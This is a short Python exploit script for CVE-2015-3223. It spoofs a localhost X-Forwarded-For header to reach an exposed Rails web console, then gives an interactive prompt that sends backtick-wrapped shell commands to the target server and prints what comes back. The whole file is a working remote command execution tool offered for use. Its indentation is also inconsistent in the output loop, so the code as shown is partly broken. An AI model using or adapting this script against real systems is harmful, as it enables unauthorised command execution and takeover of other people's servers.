#!/usr/bin/python3
import requests  
import re      

print '------------------------'
print 'Exploit - CVE-2015-3223'
print '------------------------'

url = '<replace with your URL>'


header = {
    'X-Forwarded-For' : '::1'
}


response = requests.get(url + 'somethingthatdoesntexist', headers=header)
console_path = re.findall("data-remote-path='(.*)'", response.text)[0]

print console_path

url = url + console_path

while True:
	header = {
        'X-Forwarded-For': '::1',
        'Accept': 'application/vnd.web-console.v2',
        'X-Requested-With': 'XMLHttpRequest'
	}
    
	cmd = raw_input('cmd> ')
	if cmd == 'exit' or cmd == 'quit':
		break
	elif cmd == ' ':
		continue

	cmd = '`' + cmd + '`' # Important! running shell command should be enclosed between backticks
	data = {'input': cmd}
    
	response = requests.put(url, data=data, headers=header)
	
    # beautify output
	content = response.text.split('\\n')[0:-2]
        for line in content:
            line = line.strip('\\')
            line = line.split('"', -1)[-1]
	print(line)
